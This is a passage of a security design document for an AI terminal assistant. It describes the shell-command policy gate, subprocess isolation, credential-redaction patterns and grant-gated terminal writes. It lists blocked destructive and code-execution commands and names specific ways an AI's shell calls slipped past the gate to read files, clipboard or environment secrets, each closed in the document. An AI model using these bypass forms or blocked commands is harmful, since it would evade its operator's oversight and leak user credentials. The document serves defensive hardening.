  (`cat` → Get-Content, etc.) are treated with the target cmdlet's
  semantics — under the Windows flavor `cat a,b` is split per element too
  (`head`/`tail`/`bat`/`view` are NOT aliases and keep literal comma
  semantics); select-string's unknown `-` flags and bare-comma array
  continuations (`-Path ok , evil` / `-Path ok ,evil` / `-Path ok, evil`
  forms) now push `//`-prefixed always-deny markers
  (`//<unknown-flag:…>` / `//<comma-array:…>` — UNC / root-relative forms
  that deny regardless of cwd; run_shell's cwd defaults to the trusted
  root itself, so pushing the raw relative token could be joined onto cwd
  and pass the prefix check). Stated side effects: valueless switches like
  `-CaseSensitive` / `-SimpleMatch` and quoted comma-bearing file names
  yield to array semantics — fail-closed by design.
  **Same-day round-3 closure (expression paths & stop-parsing)**: ①
  Expression-path escape — a unified guard at the `extract_paths_for_base_for`
  exit: under the Windows flavor, any extracted path token still starting
  with `(` / `@` / `$` is replaced by a `//<expr-path:…>` always-deny
  marker (`(expr)` grouping and `@(...)` array subexpressions are
  additionally blocked by Layer 0a at the gate — this guard covers call
  paths that skip Layer 0a; runtime expansion of non-USERPROFILE
  `$env:VAR` is the layer this guard alone closes). Expandable home
  variables (`$HOME` / `${HOME}` / `$env:USERPROFILE`, with separator
  boundaries) are exempt; in-root file names beginning with `(` are
  denied as a deliberate fail-closed trade-off. ② The PowerShell
  stop-parsing token `--%` (after which %VAR% expands unconditionally in
  cmd.exe semantics and all static analyzability is lost) is denied at
  segment level — hooked before all layers, and denied even for in-root
  paths. ③ `Get-FileHash` inherits the same content-hash-oracle gate as
  md5/shasum (M-sec-3; `-Algorithm` values are not mistaken for paths,
  and the `-Path=` inline form is extracted). ④ `mount` is removed from
  the Windows METADATA table — the pwsh built-in alias `mount` →
  `New-PSDrive` (drive mapping incl. UNC/WebDAV, SMB outbound NTLM relay
  surface), same shape as the `type` / `find` exceptions; macOS / Linux
  `mount` unchanged. **Alias principle**: pwsh built-in aliases are
  always classified by the target cmdlet's real semantics (cat/type →
  Get-Content reads files, mount → New-PSDrive creates mappings), never
  by inheriting the Unix namesake's classification. TS mirror updated in
  the same batch.
  **Same-day round-4 closure (PSDrive qualifiers & colon-inline flags)**:
  ⑤ PSDrive qualifier path escape — multi-character qualifiers like
  `env:PATH` / `HKLM:\…` / `Variable:HOME` are not drive letters (the
  absolute-path check only recognizes single-letter drives), so they used
  to fall into the relative-path branch and get joined onto cwd (passing
  the prefix check when cwd == the trusted root), while at runtime pwsh
  reads them as PSDrive content (API keys in environment variables would
  reach the LLM context — empirically confirmed). `resolve_cleaned_for`
  now checks the first segment's qualifier before the cwd join
  (`[A-Za-z][A-Za-z0-9]*:` with a pre-colon length > 1 → fail-closed),
  closing METADATA / FILE_READERS / TRUSTED_READ / download / redirect
  layers in one place. No-false-positive argument: `:` is illegal in
  Win32 file names, drive letters are single characters, ADS carries a
  file prefix (`name:stream` without a dot is denied as a deliberate
  fail-closed trade-off), and URL forms are meaningless in a path
  context; the Unix flavor is untouched (colons are legal in Unix file
  names). ⑥ PowerShell colon-inline flags `-Flag:value` are synonymous
  with the space / `=` forms — the generic extraction arm previously
  stripped only `=` inlines, so `Get-FileHash -Path:C:\…` /
  `ls -Path:C:\…\.ssh` had the whole token skipped as a plain flag,
  bypassing both the content-oracle gate and the V7 credential-dir gate
  (empirically confirmed). `flag_match_name` now recognizes `:` inlines
  for the scoped pwsh cmdlet bases (get-content / gc / type / format-hex
  / get-filehash / get-childitem / ls / dir / gci) under the Windows
  flavor (only known value-taking / path-valued flags; unknown flags stay
  skipped), aligning with the select-string extractor's three-form
  coverage; Unix commands have no colon-flag semantics and are
  unaffected. TS mirror updated in the same batch.
  PowerShell command names are case-insensitive:
  Windows table entries are stored lowercase, and bases are lowercased before
  lookup (`table_base_key`). 2026-08-24 wrap-up: METADATA gains `Get-Command`
  (the pwsh-correct equivalent of which — `where` is a `Where-Object` alias
  in pwsh and errors at runtime; the explicit `where.exe` form remains in the
  table); `table_base_key`'s Windows normalization additionally **strips a
  trailing `.exe`** (case-insensitive — `where.exe` / `Get-Content.exe` hit
  the same entries as the bare names; **Unix does not strip** — `.exe` is a
  legitimate filename character there). The stripped key is only used for
  allowlist / three-table lookup; it does not change the command actually
  executed, and every allowlist entry is read-only, so there is no
  privilege-escalation surface (see the `table_base_key` comment in policy.rs
  for the assessment).
- **Blacklist / safety dangerous surface**: both platforms take the same
  **global union** (not split by flavor). The policy permanent blacklist gains
  `iex` / `Invoke-Expression`, nested `powershell` / `pwsh` (whole command
  names, covering every form of `-enc` / `-EncodedCommand` base64-concealed
  execution), `cmd /c|/k`, `wsl`, `Get|Set-Clipboard` (aligned with
  `pbpaste`/`pbcopy`). safety DANGEROUS gains `format <drive>:` (anchored to
  the drive letter, avoiding false positives on `git format-patch`),
  `diskpart` / `bcdedit` / `reg add|delete` / `Set-ExecutionPolicy` /
  `Stop|Restart-Computer` / `Clear-Disk` / `Remove-Item -Recurse -Force`
  (aligned with `rm -rf`); OPERATION gains `Stop|Restart-Process`,
  `Stop|Start|Restart-Service`, `Set|Add-Content` / `Out-File`,
  `New|Rename|Move|Copy-Item`.
- **trusted root path normalization** (security invariant, fail-closed):
  `%USERPROFILE%` and `$env:USERPROFILE` expansion (case-insensitive; other
  forms are not expanded and are denied); `\` / `/` are unified to `/`; drive
  letters and whole-path comparison are case-insensitive (NTFS semantics; Unix
  stays sensitive); UNC (`\\server\share`) is always denied; `..` escapes keep
  the post-normalization prefix check; `.kaya-evil`-style prefix confusion
  keeps the "exactly equal OR root + `/`" boundary check; **8.3 short names**
  (`KAYA~1`) cannot be decided by pure string matching — the fallback is
  tightened to "any normalized path segment containing `~` is denied"
  (Windows-only rule; macOS behavior unchanged). The null-device exception is
  per-flavor: Unix `/dev/null` (plus `/dev/zero` / `/dev/urandom` on the input
  side), Windows `NUL` / `$null` — the Windows forms are not merged into Unix
  (`NUL` is a normal filename on Unix; allowing it would let `echo x > NUL`
  write to cwd). All normalization is written as flavor-parameterized pure
  functions, so the Windows cases are fully testable on a macOS host.
- **heredoc / `$(...)` scan assessment**: PowerShell has no heredoc syntax,
  and the existing scan produces **no false positives** on PowerShell command
  strings; `$(` is a subexpression in PowerShell (an execution channel) and
  Layer 0a keeps hard-denying it; **backtick is an escape character in
  PowerShell**, not command substitution — the Windows flavor no longer treats
  backticks as command substitution (otherwise `Write-Output "a`nb"` would be
  a false positive). The missed-detection surface (PowerShell here-strings
  `@"..."@`) is deliberately not patched and is left to the allowlist-miss
  catch-all.
- **PowerShell execution forms are hard-denied wholesale** (2026-08-24 review,
  fail-closed): on the Windows flavor, Layer 0a denies an unquoted `(` at the
  same level as `$(` — `(...)` grouping subexpressions and `@(...)` array
  subexpressions are both legal PowerShell syntax that **evaluates first, then
  becomes an argument** (`Write-Output (Get-Content file)` previously bypassed
  the entire gate). A bare `(` inside double quotes is a literal and is not
  denied (PowerShell double quotes only interpolate `$(` and backticks);
  false-positiving `(Get-Date).Year`-style legal forms is a deliberate
  trade-off — split such commands into separate calls. Same batch: **`\` is a
  path separator in PowerShell, not an escape character** — the two-character
  backslash skip in both the command-substitution scanner and the redirect
  scanner (strip_unquoted_redirects) is disabled on the Windows flavor —
  otherwise the `$(` in `C:\$(Get-Clipboard)` and the `\>` in `Get-Date \>
  out.txt` would be eaten as escape pairs, causing arbitrary-read /
  arbitrary-write fail-open respectively. Since Round 2 the segmenter
  (split_segments) disables the skip as well: `;` / `|` do not require
  surrounding whitespace in PowerShell, and the `\;` / `\|` escape forms in
  `Write-Output x\;Get-Content C:\secret` used to swallow the whole command
  into a single segment (base ∈ METADATA allowed it, and the swallowed reader
  was never scanned); these are now hard-denied too. Unix behavior is
  byte-identical (zsh's `\` escape semantics and the syntax-error nature of
  bare `(...)` are unchanged).
- **The gate is explicitly flavor-parameterized** (2026-08-24 review):
  `check_run_shell_policy` gained a
  `check_run_shell_policy_for(command, ctx, flavor)` thin shell; the entire
  gate (three tables / lookup key / basename / command-substitution and
  redirect scans / trusted read+download / trusted-root normalization) threads
  the flavor through instead of hard-coding `OsFlavor::current()` internally —
  end-to-end regression tests for the Windows branch run directly on a macOS
  host, aligned with the TS mirror matrix.
- **Cmdlet flag forms**: path extraction recognizes PowerShell's three
  flag-assignment forms — `-Path value` (spaced), `-Path:value`
  (colon-inline), `-Path=value` (equals-inline, added 2026-08-24; previously
  the `=` form of `Select-String -Path=C:\secret` was not recognized, leaving
  the path set empty and misjudging the command as stdin-only allow — a
  fail-open, now fixed with a regression matrix). The `-Path=` /
  `-LiteralPath=` values of `Get-Content` / `type` / `Format-Hex` are likewise
  treated as paths and go through trusted_root validation; flags like
  `-Tail=5` whose value is not a path are not misjudged. **Flag prefix
  abbreviations** (`-pa` = `-Path`) are not recognized — they are skipped as
  unknown flags and caught by the no-path determination (Layer 6 deny) /
  allowlist-miss; a known residual risk.
- **scrub safe-name**: the env-var scrub keyword regex (`KEY` / `SECRET` /
  `TOKEN` / `PASSWORD` / …) has had no safe-name allowlist since Round-58 (the
  old deny list was dead code and has been deleted); Windows system variables
  (`USERPROFILE` / `APPDATA` / `PSMODULEPATH` etc.) contain none of those
  keywords and are naturally never redacted — **no new entries needed**.

---

## 6. Gate 3: Execute Isolation

Source: `crates/kaya-core/src/llm/tools/run_shell.rs` (stage 3)

When the AI invokes `run_shell`, Rust **independently** spawns a `zsh -f -c <cmd>`
subprocess:

- `-f` suppresses `~/.zshrc` loading — this is **critical**. Without suppression,
  aliases defined in the user's rc file such as `ls='rm -rf $HOME/.cache'` would be
  expanded, so the policy check sees the literal command name (`ls`) but the
  actually executed command is `rm -rf`.
- **Does not use the user's PTY**. A fully independent subprocess — failures do
  not affect xterm state.
- **8 second default timeout** (`DEFAULT_TIMEOUT_SECS`; user-configurable via
  `run_shell.timeout_secs`; slow-scan commands like `du` / `find` / `grep` get
  a 30s floor, `SLOW_SCAN_MIN_SECS`) + **100KB output cap**. On timeout the
  process is killed.
- **No persistent network state**: Unlike the venv / conda / alias accumulation
  in the user's shell, the AI's subprocess is a clean zsh each time — side
  effects do not pollute the user environment.
- **Subprocess environment = boot capture + Strict-scrubbed snapshot, not bare
  inheritance** (round-70): at app start, an environment is captured via
  `zsh -l -c 'printenv -0'` (Windows: the process env), **each value is scrubbed
  at the most aggressive level** (API keys / PEM / cloud credentials become
  `[REDACTED:…]`) and then injected key by key as KEY=VALUE into the subprocess;
  only keys absent from the snapshot are inherited from kaya's parent process.
  This way a subprocess started from Finder/launchd (minimal env) still sees the
  brew/nvm PATH, while secrets in the user env never enter the subprocess
  verbatim. Since 2026-09-07 the IM channel shares the **very same** snapshot
  with desktop chat (previously the IM side had an empty snapshot and only
  inherited the parent-process env; see §4.6).

> Windows port Phase 1d (2026-08-24): on Windows the subprocess is
> `pwsh/powershell -NoProfile -Command <cmd>` (the argument form is dispatched
> by shell filename via `pty::env::shell_exec_args`) — `-NoProfile` does not
> load `$PROFILE`, the same design intent as `-f`; timeout kills go through the
> `taskkill /PID <pid> /T /F` process tree (Unix uses a killpg process group);
> boot-time environment capture (`capture_user_env`) is skipped wholesale in
> favor of the process env (Windows GUI launches have no launchd-env
> deficiency). The five-gate structure is unchanged. Since W1.3 (2026-08-25),
> a `[Console]::OutputEncoding=UTF8` prelude is injected before `-Command` on
> Windows (injected after the gates, so policy/safety semantics are
> unaffected), and pipe byte decoding gains a GBK fallback (localized output
> of native exes on Chinese systems).

---

## 7. Gate 4: Output Scrub (Credential Redaction)

Source: `crates/kaya-core/src/llm/scrub.rs` + TS mirror `src/lib/scrubber.ts`

### 7.1 Round-54 (2026-06-25) Three-Tier Design

The ~38 secret / PII patterns are divided into three tiers based on "must this
never leak?" (v2.1.10 review R2 added 8 categories against common gitleaks
rules — see the end of the Tier 0 list):

**Tier 0 — Core (runs at every level; Minimal / Balanced / Strict all enable it)**

Core secrets that must never be level-gated — even if the user picks "strict"
(the weakest UI option), API keys / PEM private keys cannot leak. ~36
categories (since v3.0.7 this includes the 8 gitleaks-alignment additions —
see §7.8):

- Provider tokens: AWS (`AKIA[16 chars]` + two prefix forms `AWS_ACCESS_KEY_ID=`
  / `AWS_SECRET_ACCESS_KEY=`) / GitHub PAT (4 sub-types: `ghp_` / `gho_` /
  `github_pat_` / `(ghu|ghs|ghr)_`) / GitLab PAT / Anthropic / OpenAI
  (`sk-proj-`) / DeepSeek / Moonshot (`sk-[32+ chars]`) / Stripe
  (`sk_live_` / `sk_test_`) / Slack / Telegram bot / Tavily
  (`tvly-[A-Za-z0-9_-]{20,}`) / **v2.1.10 review R2 additions (gitleaks
  alignment)**: Slack app-level (`xapp-<digit>-…`) / npm (`npm_` + exactly 36
  chars) / PyPI (`pypi-AgEIcHlwaS5vcmc` fixed prefix + 50+ chars) / SendGrid
  (`SG.` + exactly 22 + 43 chars) / DigitalOcean (`dop_v1_` + exactly 64
  lowercase hex) / Shopify (`shpat_` + exactly 32 hex) / Twilio (`SK` +
  exactly 32 lowercase hex) / three-segment JWT (`eyJ…​.…​.…`, each segment
  ≥8 chars, category `jwt`)
- Generic `api_key=xxx` form (with a fake-key filter: `xxx` / `changeme` /
  `placeholder` etc. are not accidentally matched). **2026-08-20 review C3**:
  an optional quote `['"]?` was added before the value — the old
  `~/.kaya/agent-providers.json` stored `"api_key": "sk-…"` (JSON form; that
  file was superseded by the unified model library on 2026-09-10 and the keys
  themselves moved up into the keychain, but the `.json.migrated` leftover and
  each agent's own config files may still contain JSON-form keys); the old
  `:`-form regex was blocked by the `"` between the `:` and the value, so the
  whole JSON value would leak to the LLM via a trusted-read `cat`. Rust
  `API_KEY_RE` and TS `scrubber.ts` are aligned (TS already had `['"]?`); the
  parity test `scrubs_api_key_json_quoted_value` locks both sides.
- Bearer token: Combined `Authorization: Bearer eyJ...` and bare `eyJ...eyJ...`
  forms under a single category name `bearer-token`. **v2.1.10 review R2**:
  the Rust side gained the bare `eyJ…eyJ…` alternative (previously Rust had
  no such pattern — a bare JWT was only caught segment-by-segment by the
  entropy fallback, and the `.`-separated payload / signature segments could
  leak); three-segment JWTs whose payload does NOT start with `eyJ` are
  covered by the new `jwt` category (identical on both sides)
- URL credentials (http(s)://user:pass@)
- Whole PEM private-key blocks (BEGIN + body + END, 7 type variants)
- DB URL password (`mysql://` / `postgres://` / `mongodb://` / `redis://` /
  `amqp://` / `rabbitmq://` / `sftp://` / `smtp://` carrying user:pass@)
- High-entropy fallback (`\b[A-Za-z0-9+=]{20,}\b` + character-class diversity
  + at least 2 distinct character types + not a PEM block + not natural language)

**Tier 1 — Env (runs at balanced + aggressive)**

- `KEY=value` / `export FOO=bar` pattern (with a deny list for safe keys such as
  `PATH` / `HOME`; only truly sensitive values are redacted)
- Cloud provider keys: GCP (`AIza[35 chars]`) / Azure (`AccountKey=` + 86-88
  base64) / Alibaba (`LTAI[16+ chars]`)

**Tier 2 — PII (only the aggressive level)**

- Email
- Phone (CN `1[3-9]\d{9}` + intl `\+[1-9]\d{6,14}`)
- US SSN (`\d{3}-\d{2}-\d{4}`)
- Credit card (passes Luhn check before being treated as a real card; 16-digit
  hardware UUIDs are not accidentally matched)
- id-cn 中国身份证号 (Chinese national ID: a 17–19 digit run + an 18-digit X/x
  check-digit form, whole-span redaction; round-58 removed the checksum gate,
  round-72 widened to 17–19 digits, 2026-07-20 review fixed the Rust-side
  19-digit leak + the X check digit sharing the span). **Registry order: id-cn
  comes before credit-card** — when the same run passes both the GB-11643 check
  digit and Luhn, it's classified as id-cn; the Rust (`tier2_pii`) and TS
  (`scrubber.ts` registry) orders must match (each side has an intersection
  fixture locking `1101052000010100008`; drift → audit-judge category-mismatch)

### 7.2 Three Strictness Levels — The Naming is Inverted (On Purpose)

| Front-end label | Rust side | Triggers |
|---|---|---|
| `aggressive` (default) | `Strict` | Tier 0 + 1 + 2 |
| `balanced` | `Balanced` | Tier 0 + 1 |
| `strict` | `Minimal` | Tier 0 (no longer just the high-entropy path) |

**high-entropy always runs last (every level)**: before the 2026-07-20 review
fix, Rust ran `scrub_high_entropy` near the **start** of tier0 (ahead of the
specific patterns), the opposite priority of the TS mirror (last registry
entry) — so a 20+ char run containing an ID split categories across the two
sides (Rust `entropy-string` / TS `id-cn`, audit-judge category drift). Now
Rust runs entropy **after** the tier dispatch at every level — specific
patterns (id-cn / provider key etc.) win the category first, entropy is the
fallback, and the two sides align shape-for-shape (regression lock:
`crates/kaya-core/tests/id_cn_entropy_mirror.rs` ↔ `scrubber.test.ts`
"round-2 mirror parity").

**Round-54 Behavior Change (privacy-first)**:

- **Default changed to `aggressive`**: The pre-round-54 `Balanced` default would
  let PII leak, violating the privacy-first positioning. CLI / desktop / unknown-
  string fallback all follow `aggressive`.
- **Core secret patterns now run at every level**: Pre-round-54, `aws-access-key`
  / `private-key` / `bearer-token` / `github-pat-*` / `slack-token` were enabled
  in the Rust `Balanced` level only — at `Minimal` (the user's "strict") they
  would leak. The TS side, meanwhile, ran them at `strict`. The two sides'
  behavior diverged. Round-54 promoted all core secrets to Tier 0, unifying the
  two sides.
- **store v18 hard migration**: Desktop users with persisted `localStorage
  .scrubLevel == "balanced"` / `"strict"` are automatically upgraded to
  `"aggressive"` (the `store.ts` v17→v18 migration body). An explicit
  `scrub_level` written in CLI config.toml is not overwritten — the CLI
  respects explicit configuration and only changes the default.

`scrub.rs::frontend_name_to_scrub_level` is the single source of truth. The
naming is **inverted** because the Rust side uses "strict = block more" as the
baseline, while the front-end UI label "aggressive = block more" reflects the
user's perspective. Both namings are reasonable — only when translated inversely
do they line up. **When changing this mapping pair, update all three places:
README / CLAUDE.md / the `scrub.rs` header comment.**

### 7.3 Round-55 (2026-06-26) Follow-up — TS/Rust Regex Alignment Patches

After round-54 landed, code review found 9 places where TS / Rust patterns were
not aligned. This section lists the patches that strengthen the §7.1 Tier design.
Full spec + tests:
`docs/superpowers/specs/2026-06-25-scrub-default-aggressive-design.md` §11.

**Strengthening of §7.1 Tier 0** (all directly security-related):

- **`env-var-secret` (Tier 1) multi-line matching**: The previous regex had no
  `m` flag, so `^` only matched the start of input. Secrets on the 2nd and later
  lines of `printenv` / `env` dumps slipped past entirely. round-55 added the
  `m` flag (TS) / `(?m)` (Rust), so every line goes through the scan + deny list.
  Dumps like `API_KEY=sk_live_xxx\nSECRET_KEY=yyy` are now correctly redacted.
- **`aws-access-key` adds `AWS_SECRET_ACCESS_KEY=` prefix support**: The previous
  TS regex only matched bare `AKIA[16 chars]` or `AWS_ACCESS_KEY_ID=AKIA...`, so
  a real 40-char `AWS_SECRET_ACCESS_KEY=<base64>` (no AKIA prefix) would leak.
  The Rust side has had this since round-7. round-55 added it on the TS side.
- **`deepseek-key` adds `\b` boundary + `_`/`-` characters**: The previous TS
  regex `/sk-[A-Za-z0-9]{32,}/` had no word boundary, so tokens with internal
  `-` would leak. The Rust side has had this since round-7. round-55 added it
  on the TS side.
- **`password-in-url` supports empty usernames**: `redis://:pass@host` (empty
  username, used in Redis without ACLs) was previously missed; now it matches.
- **11 Tier 0 / Tier 1 patterns add `\b` boundaries** (`githubPat*` /
  `gitlabPat` / `anthropicKey` / `stripeLive/Test` / `slackToken` /
  `gcpApiKey` / `alibabaAccessKey`): Tokens wrapped in punctuation (parens /
  markdown fences / HTML tags) were previously mis-categorized; round-55's `\b`
  ensures only true token boundaries match, so the audit-judge's deterministic
  replay no longer reports `category-drift`.
- **`openai-key` narrowed to the `sk-proj-` prefix**: The previous
  `/sk-(proj-)?.../` bucketed bare `sk-` 32+ chars (which are actually deepseek
  shape) under `openai-key`, and audit-judge replay reported `openai-key` vs
  Rust `deepseek-key` drift. round-55 forces the `sk-proj-` prefix to align
  with Rust `OPENAI_PROJ_KEY_RE`. **A real OpenAI legacy `sk-` key falls into
  the deepseek-key bucket** (the secret is still redacted — only the
  classification label differs — this trade-off is explained in the `deepseek-key`
  row of the Pattern 库 table in
  `docs/superpowers/specs/2026-06-12-llm-secrets-redaction-design.md`).
- **`azure-storage-key` adds `/i` flag**: Lowercase `accountkey=` (common in
  `kubectl get secrets -o yaml` output) was previously missed; now it matches.
- **`slack-token` character class drops `o`**: The previous `[aboprs]` included
  `o`, which would match non-existent `xoxo-...` tokens. The Rust side has
  always been `[baprs]`.

**Test strengthening** (11 new tripwires):

- 9 `\b` boundary regression tests: 1 per Tier 0 pattern, locking in "when
  wrapped by punctuation, do not bucket into a specific category; fall through
  to high-entropy fallback".
- 1 `azure-storage-key lowercase` regression test
- 1 `slack-token xoxo-` negative regression test

**Current test coverage** (re-measured 2026-08-04):

- TS: 2457 tests pass (71 spec files)
- Rust: the suite continues to grow by module; see §11.1 for exact counts of
  the privacy-critical modules

(Historical workspace totals are easily affected by new non-privacy tests and
the known parallel PTY flake. This section therefore uses the stable full
`npm test` result and the statically verifiable per-module counts in §11.1 as
the current baseline.)

### 7.4 Key Invariant: Whole-Block PEM Redaction

See §4.3. Rust uses `once_cell::Lazy<Regex>` to compile once, with the 7 type
variants' BEGIN/END pairs as an alternation. CLI / desktop / audit judge all
share the same `ssh_key_regex()` access entry point (2026-06-23 round-7 dedup);
adding a new type requires changing only one place.

**Round-54 addition**: The high-entropy fallback now skips the entire
`-----BEGIN ... KEY-----` block (public + private). Public-key bodies look like
base64 (high-entropy shape) but are meant to be publicly shared; private-key
bodies are already whole-block-redacted by `private-key`, so high-entropy
doesn't need to bite them a second time. `PEM_BLOCK_RE` (present in both the
Rust and TS mirrors) filters out all PEM spans before `looks_like_token`.

### 7.5 Unified Placeholder Format

Both the Rust and TS sides now output `[REDACTED:<category>]` (unified after
2026-06-19), so the LLM knows "what kind of thing was lost" and can keep
reasoning. Pre-2026-06-19, the Rust side was `[<category>]` and the front-end
was `[REDACTED:<category>]`, which caused conversation JSON / debug JSONL / UI
display to be inconsistent — switching to the unified format fixed that.

### 7.6 External API Tools (round-58, 2026-06-29)

`kaya`'s LLM can search the web and fetch pages through Tavily
(`tavily_search` / `tavily_extract` tools). All content returned by Tavily
**defaults to passing through the user's current `scrubLevel` filter** (default
`aggressive` = Tier 0+1+2 all on), to prevent potential API keys / PII /
passwords in external pages from leaking to the LLM.

**Untrusted assumption**: Content returned by Tavily is treated as external
untrusted input. Even after scrubbing, 100% cleanliness is not guaranteed (regexes
cannot catch base64 / encrypted blobs). When the LLM cites such content,
manual verification of key facts is recommended.

### 7.7 terminal_read (read-only terminal output visibility, 2026-08-09)

chat's `terminal_read` tool can list your terminal tabs and read the recent
output of a chosen tab (a per-tab 64 KiB ring buffer, in memory only, never
written to disk; the capture layer strips ANSI control sequences and performs
minimal line-overwrite emulation — `\r` overwrites the current screen row /
`ESC[K` erases to end of line / `\x08` backspaces / soft-wrapped rows are
joined by terminal width — reconstructing echo lines into the contiguous
text a real screen shows, otherwise wrap-redraws would shred secrets such as
card numbers into fragments that evade redaction (2026-09-17); while a
full-screen TUI (vim, AI CLIs, etc.) is running, capture switches to a live
screen snapshot — the built-in terminal emulator (vt100) reconstructs the
screen in memory, so what is read is the current screen text and cursor
position, likewise in memory only and never written to disk, and filtered
through the same scrub pipeline as every tool before reaching the AI).

- **When scrubbing happens**: terminal text is filtered through `scrub_text`
  only when the LLM invokes the tool, before it reaches the LLM — the same
  pipeline and the same privacy level as run_shell / list_dir. The secret
  redaction level you adjust in Settings applies to it the same way.
- **cwd is not scrubbed**: the tab list shows each tab's cwd — process
  metadata, the same category already exposed via run_shell's cwd/trusted_root
  and never scrubbed — but a project directory NAME can itself embed a
  sensitive string; users who keep secrets in directory names should be aware.
- **Inherent limitation**: scrub is pattern-based and cannot stop every
  secret. During highly sensitive terminal work (viewing private keys,
  production credentials, etc.), avoid letting the AI read the terminal, or
  temporarily raise the level to aggressive.
- **Read-only boundary (default)**: by default (before any grant) the AI
  cannot write anything to your terminal; terminal_read has no write
  channel — grant-gated writes are covered in the next section.

**Grant-gated write (2026-08-16, P1; master gate added 2026-08-17)**: the
precondition is the **coding-mode toggle** in the top bar — it is the master
gate for "driving"; while it is off, the `terminal_write` tool is not even
registered and the chat side has no ability to send input to terminal AIs at
all. Once it is on, and after you explicitly allow a tab on the grant card in
the chat, chat's `terminal_write` tool can send input to that tab
running a whitelisted AI CLI. The grant lives in memory, bound to the
(tab, agent process) pair, and expires when the process exits or the tab
closes; an app restart clears all grants. Every grant request and write is
recorded in the local audit log (metadata: tab, agent, pid, byte count,
plus a secret-scrubbed preview of the input, truncated to 200 characters;
key writes record null). On macOS, foreground-process detection relies on `tcgetpgrp` + a `ps`
snapshot, which can precisely tell whether the current foreground
process group is a whitelisted CLI. On Windows (since 2026-08-26) it
uses a sysinfo process snapshot matched against the process subtree of
that tab's shell (`.exe`-suffix normalized; ConPTY has no
foreground-process-group concept, so "a whitelisted CLI exists in the
session's process tree" is the approximation — this also considers
background agents within the same shell subtree writable, a looser
security boundary than macOS). The data never leaves this machine.
R3 hardening (2026-08-31): ① a `text` argument containing terminal control
characters (any C0/C1 other than Tab/LF) is denied with
`[safety:control-chars]` — this blocks post-authorization terminal-control
injection (window-title rewrites / OSC 52 clipboard writes) via the agent's
echo or TUI input parsing; control sequences may only be sent through the
enum-constrained `key` parameter. ② the trailing-newline submit key `\r` is
written 500 ms after the body (a paste-burst guard in kimi-code etc. swallows
a back-to-back CR), and before the `\r` is sent the foreground process and
grant are re-validated to the same standard — if the agent exits within the
500 ms window the write fails closed and the CR never lands in a plain shell.
④ Since 2026-10-08, the grant-approval command `control_grant_respond`
requires a matching pending grant request (an approval with no pending
request is denied outright, an approval matching an existing grant with the
same fingerprint passes idempotently, and deny is not subject to the gate) —
a bare IPC call from inside the WebView can no longer self-authorize out of
thin air.

**Numeric answer write (interaction_answer, 2026-08-16/17)**: the second
"write to terminal" channel besides terminal_write. In coding mode, the
numeric options of a TUI approval menu are delivered along with the event;
typing the menu number into the chat input writes the selected key back to
the TUI. Only single digits 1-9 are accepted; the Rust side writes only after
four fail-closed re-checks all pass (tab liveness re-read under lock /
foreground-process whitelist via driving_roster / menu re-derived from the
latest screen snapshot / option validity). It is not a bypass of
terminal_write and consumes no LLM driving grant — typing a digit is your own
explicit action; the LLM never answers on your behalf.

**Unknown `/command` forwarding (agent_command, 2026-08-18)**: the third
terminal write path. When the chat input is an unknown `/command` and the
current session is bound to an agent, the verbatim text is forwarded to that
agent's terminal input line followed by Enter; the binding is session-scoped
in-memory state (`store.agentTarget`), never written to disk. The backend
`run_agent_command` mirrors interaction_answer's fail-closed re-checks, and
`validate_agent_command_text` rejects control characters (including Unicode
bidi/zero-width characters U+202A-202E / U+2066-2069 / U+200B-200F / U+FEFF —
Trojan Source visual-spoofing surface, R3 hardening) and oversized text;
a successful forward records a user-input audit event (through the input
guard).

**Interaction watch and proactive reports**: the watcher is **read-only**:
it pattern-matches screen snapshots, never injects terminal input, and always
Strict-scrubs excerpts. Explicitly enabling Coding sends local workspace
agent status and excerpts to the selected Chat model for an overview. Idle
and waiting-for-decision events are combined into occasional follow-ups;
the model may use `terminal_read` to inspect recent input and output. Both
report input and tool output always use Strict scrubbing, with an isolated
per-turn setting that concurrent requests cannot downgrade. A dedicated
`read_only_report` wire field makes Rust retain only `probe_env`,
`list_dir`, `terminal_read`, `agent_state`, and `agent_report` after the full
tool assembly. Future tools are excluded by default; `run_shell`,
`terminal_write`, all task/schedule/config/Agent mutations, memory writes
(including fallback capture), and nonessential network tools are absent. The
frontend also
rejects schedule/queue/task mutation events belonging to the current
read-only turn by turn identity, so forged events cannot reach the store.
Reports do not consume forwarding bindings or answer menus. They defer while
Chat is busy; capacity released by an ordinary Chat start failure or a valid
external turn finish explicitly re-evaluates pending reports, while a Coding
report's own busy/failed outcome cannot self-trigger. Turning the mode off,
switching conversations, or pressing Stop cancels unsent reports.
Busy/status updates, agent appearance/exit, and card selection do not trigger
model turns. Restoring the saved mode on startup only refreshes local facts.
Remote agent reading is not automatically initiated here and retains its
separate admission gates.

**Agent situation injection (2026-09-23, v2.4.0)**: when coding mode is on,
or the current session is bound to an agent, your message may be prefixed
with a `[host] Live agent roster` block (each running agent's
busy/idle/waiting-for-confirmation state, a summary of what it is doing,
permission mode, context usage, pending todo count) that is sent to your
selected model along with that turn. The block's content comes entirely
from the watcher event pipeline — it has passed output scrub (gate 4) and
finalization before reaching the registry, at the same trust level as the
binding prefix / excerpt injection above. The live agent state registry
(`agents/state_registry.rs`) is a purely in-memory structure
(`Arc<Mutex<HashMap>>`): never written to disk, holds no secret material;
when a tab closes or an agent exits, the entry is marked exited at the
next watcher reconciliation tick (~2s) and disappears from snapshots and
injection immediately, and exited entries are pruned from memory after 10
minutes. Injection is deduplicated per conversation by content fingerprint
(the fingerprint covers only stable fields — state/excerpt/permission/
context/todo counts — so the ticking "Nm ago" rendering never defeats
dedup; unchanged content is not re-injected within 5 minutes); the
fingerprint table is likewise in-memory only. IM channels use the same registry, injection function, and dedup semantics.
Cross-device peer turns are an exception: they do not inject machine-wide
agent/task situation blocks. Before each execution, the three read-only tools
recompute allowed tabs from the current registry; results are discarded if the
scope changes during the read.

**Methodology injection (methodology.md, 2026-09-25)**: `~/.kaya/methodology.md`
is a coding-methodology file you place inside the trusted root yourself; when
the commander role section's injection condition is met (terminal_write and
agent_state both in the tool table), its content is sent verbatim to your
selected model as part of the system prompt. **Note: the injection does not
pass through output scrub** (unlike the trusted-read `cat` path — content read
via `cat` still goes through gate-4 redaction, while the system-prompt
injection is verbatim); make sure the file contains no sensitive information
before writing it. The file already lives inside the trusted root, so the
injection does not widen the LLM's visible surface. Content beyond 640 bytes
is truncated on a UTF-8 character boundary (so a large file cannot crowd out
the system-prompt budget). When the file is missing or empty, a built-in
default methodology (zh/en) is injected instead — that default has nothing to
do with the user file.

### 7.8 v3.0.7 Scrub Hardening Batch (2026-10-08, four-track audit fixes, both mirrors synchronized)

